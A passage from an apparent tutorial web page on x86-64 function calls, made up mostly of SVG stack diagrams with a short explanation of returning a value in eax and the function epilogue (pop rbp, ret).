<text text-anchor='middle' x='320' y='532' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='596' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='628' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='276' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='340' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='328' y='372' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='328' y='404' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='328' y='468' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='500' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='532' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='564' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='596' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='328' y='628' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='336' y='276' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='336' y='340' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='336' y='468' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='336' y='500' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='336' y='532' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='336' y='564' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='336' y='596' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='336' y='628' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='344' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='360' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='376' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='376' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='384' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='384' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='392' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='392' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='408' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='416' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='416' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='424' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='424' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='424' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='432' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='440' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='448' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='448' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='456' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='464' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='472' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='472' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='480' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='480' y='164' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='480' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='488' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='488' y='308' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='496' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='308' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='504' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='512' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='512' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='520' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='520' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='528' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='528' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='536' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='308' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='544' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='560' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='560' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='568' y='164' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='568' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='568' y='468' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='568' y='628' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='576' y='164' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='576' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='576' y='324' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='576' y='468' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='576' y='628' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='584' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='584' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='468' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='584' y='628' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='592' y='164' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='592' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='592' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='468' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='592' y='628' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='600' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='468' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='600' y='628' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='608' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='616' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='196' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='624' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='532' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='632' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='632' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='532' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='640' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='640' y='532' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='648' y='532' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='656' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='656' y='532' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='664' y='324' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='672' y='324' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='672' y='532' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='680' y='532' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='688' y='532' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='696' y='532' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='704' y='532' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='712' y='532' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='720' y='532' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='728' y='532' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='736' y='532' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='752' y='532' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='760' y='532' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='768' y='532' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='784' y='532' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='792' y='532' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='800' y='532' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='808' y='532' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='816' y='532' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='824' y='532' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='840' y='532' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='848' y='532' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='856' y='532' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='864' y='532' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='872' y='532' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='880' y='532' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='888' y='532' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='896' y='532' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='904' y='532' fill='currentColor' style='font-size:1em'>s</text>
</g>

    </svg>
  
</div>
<p>Then we set <code>eax</code> to the value we want to return back to the caller function <code>func1()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="err">1165:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">fc</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">]</span>
</span></span></code></pre></div><p>And finally, we pop the <code>rbp</code> from stack and move to the instruction in the previous function from where we left the execution. This is called <a href="https://en.wikipedia.org/wiki/Function_prologue_and_epilogue#Epilogue"><strong>Epilogue</strong></a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="err">1168:</span>       <span class="err">5</span><span class="nf">d</span>                      <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">1169:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p>After this, the stack will look something like as shown below:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 608 313"
      >
      <g transform='translate(8,16)'>
<path d='M 544,144 L 544,160' fill='none' stroke='currentColor'></path>
<path d='M 544,160 L 544,176' fill='none' stroke='currentColor'></path>
<path d='M 544,176 L 544,192' fill='none' stroke='currentColor'></path>
<circle cx='160' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='160' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='176' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='176' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='192' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='192' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='208' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='208' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='24' y='260' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='32' y='260' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='40' y='260' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='56' y='260' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='64' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='72' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='160' y='228' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='228' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='280' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='288' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='304' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='344' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>u</text>
